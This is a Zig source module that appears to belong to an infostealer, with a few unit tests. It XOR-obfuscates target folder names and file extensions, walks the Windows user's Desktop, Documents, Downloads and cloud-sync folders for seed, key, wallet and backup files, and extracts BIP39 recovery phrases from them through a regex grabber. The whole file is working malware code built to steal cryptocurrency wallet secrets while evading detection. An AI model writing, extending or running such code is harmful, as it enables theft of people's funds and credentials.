const std = @import("std");
const hash = @import("../types/hash.zig");
const regex_grabber = @import("regex_grabber.zig");

pub const SeedResult = struct {
    files: [][]const u8,
    phrases: [][]const u8,
};

const E = struct {
    pub const bip39_tag = hash.xorEncrypt("BIP39");
    pub const desktop = hash.xorEncrypt("Desktop");
    pub const documents = hash.xorEncrypt("Documents");
    pub const downloads = hash.xorEncrypt("Downloads");
    pub const onedrive = hash.xorEncrypt("OneDrive");
    pub const dropbox = hash.xorEncrypt("Dropbox");
    pub const gdrive = hash.xorEncrypt("Google Drive");
    pub const ext_seed = hash.xorEncrypt(".seed");
    pub const ext_seedphrase = hash.xorEncrypt(".seedphrase");
    pub const ext_mnemonic = hash.xorEncrypt(".mnemonic");
    pub const ext_phrase = hash.xorEncrypt(".phrase");
    pub const ext_key = hash.xorEncrypt(".key");
    pub const ext_secret = hash.xorEncrypt(".secret");
    pub const ext_txt = hash.xorEncrypt(".txt");
    pub const ext_backup = hash.xorEncrypt(".backup");
    pub const ext_wallet = hash.xorEncrypt(".wallet");
};

const MAX_FILE_SIZE: usize = 100 * 1024;

fn hasSeedExtension(name: []const u8, exts: []const []const u8) bool {
    for (exts) |ext| {
        if (std.ascii.endsWithIgnoreCase(name, ext)) return true;
    }
    return false;
}

fn scanDirectory(allocator: std.mem.Allocator, dir_path: []const u8, exts: []const []const u8, files: *std.ArrayList([]const u8), phrases: *std.ArrayList([]const u8)) void {
    var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch return;
    defer dir.close();

    var walker = dir.walk(allocator) catch return;
    defer walker.deinit();

    while (try walker.next()) |entry| {
        if (entry.kind != .file) continue;
        if (!hasSeedExtension(entry.basename, exts)) continue;

        const full_path = std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.path }) catch continue;
        defer allocator.free(full_path);

        const stat = dir.statFile(entry.path) catch continue;
        if (stat.size > MAX_FILE_SIZE) continue;

        const secrets = regex_grabber.scanFile(full_path, allocator) catch continue;
        defer {
            for (secrets) |s| allocator.free(s.value);
            allocator.free(secrets);
        }

        var bip39_tag_buf: [E.bip39_tag.len]u8 = undefined;
        hash.xorDecrypt(&E.bip39_tag, &bip39_tag_buf);

        for (secrets) |s| {
            if (std.mem.eql(u8, s.secret_type, &bip39_tag_buf)) {
                files.append(std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.path }) catch continue) catch {};
                phrases.append(allocator.dupe(u8, s.value) catch continue) catch {};
            }
        }
    }
}

pub fn collect(allocator: std.mem.Allocator) !SeedResult {
    var files = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (files.items) |f| allocator.free(f);
        files.deinit();
    }
    var phrases = std.ArrayList([]const u8).init(allocator);
    errdefer {
        for (phrases.items) |p| allocator.free(p);
        phrases.deinit();
    }

    const user_profile = std.process.getEnvVarOwned(allocator, "USERPROFILE") catch return SeedResult{ .files = &.{}, .phrases = &.{} };
    defer allocator.free(user_profile);

    var desktop_buf: [E.desktop.len]u8 = undefined;
    hash.xorDecrypt(&E.desktop, &desktop_buf);
    var documents_buf: [E.documents.len]u8 = undefined;
    hash.xorDecrypt(&E.documents, &documents_buf);
    var downloads_buf: [E.downloads.len]u8 = undefined;
    hash.xorDecrypt(&E.downloads, &downloads_buf);
    var onedrive_buf: [E.onedrive.len]u8 = undefined;
    hash.xorDecrypt(&E.onedrive, &onedrive_buf);
    var dropbox_buf: [E.dropbox.len]u8 = undefined;
    hash.xorDecrypt(&E.dropbox, &dropbox_buf);
    var gdrive_buf: [E.gdrive.len]u8 = undefined;
    hash.xorDecrypt(&E.gdrive, &gdrive_buf);

    var ext_seed_buf: [E.ext_seed.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_seed, &ext_seed_buf);
    var ext_seedphrase_buf: [E.ext_seedphrase.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_seedphrase, &ext_seedphrase_buf);
    var ext_mnemonic_buf: [E.ext_mnemonic.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_mnemonic, &ext_mnemonic_buf);
    var ext_phrase_buf: [E.ext_phrase.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_phrase, &ext_phrase_buf);
    var ext_key_buf: [E.ext_key.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_key, &ext_key_buf);
    var ext_secret_buf: [E.ext_secret.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_secret, &ext_secret_buf);
    var ext_txt_buf: [E.ext_txt.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_txt, &ext_txt_buf);
    var ext_backup_buf: [E.ext_backup.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_backup, &ext_backup_buf);
    var ext_wallet_buf: [E.ext_wallet.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_wallet, &ext_wallet_buf);

    const exts = [_][]const u8{
        &ext_seed_buf,   &ext_seedphrase_buf, &ext_mnemonic_buf,
        &ext_phrase_buf, &ext_key_buf,        &ext_secret_buf,
        &ext_txt_buf,    &ext_backup_buf,     &ext_wallet_buf,
    };

    const dirs = [_][]const u8{
        &desktop_buf,  &documents_buf, &downloads_buf,
        &onedrive_buf, &dropbox_buf,   &gdrive_buf,
    };

    for (dirs) |dir| {
        const dir_path = std.fs.path.join(allocator, &[_][]const u8{ user_profile, dir }) catch continue;
        defer allocator.free(dir_path);
        scanDirectory(allocator, dir_path, &exts, &files, &phrases);
    }

    return SeedResult{
        .files = try files.toOwnedSlice(),
        .phrases = try phrases.toOwnedSlice(),
    };
}

test "collect handles non-existent userprofile gracefully" {
    const result = try collect(std.testing.allocator);
    defer {
        for (result.files) |f| std.testing.allocator.free(f);
        std.testing.allocator.free(result.files);
        for (result.phrases) |p| std.testing.allocator.free(p);
        std.testing.allocator.free(result.phrases);
    }
}

test "hasSeedExtension matches" {
    var ext_seed_buf: [E.ext_seed.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_seed, &ext_seed_buf);
    var ext_txt_buf: [E.ext_txt.len]u8 = undefined;
    hash.xorDecrypt(&E.ext_txt, &ext_txt_buf);

    const exts = [_][]const u8{ &ext_seed_buf, &ext_txt_buf };
    try std.testing.expect(hasSeedExtension("wallet.seed", &exts));
    try std.testing.expect(hasSeedExtension("backup.txt", &exts));
    try std.testing.expect(!hasSeedExtension("photo.jpg", &exts));
}

test "SeedResult default" {
    const sr = SeedResult{ .files = &.{}, .phrases = &.{} };
    try std.testing.expectEqual(@as(usize, 0), sr.files.len);
    try std.testing.expectEqual(@as(usize, 0), sr.phrases.len);
}
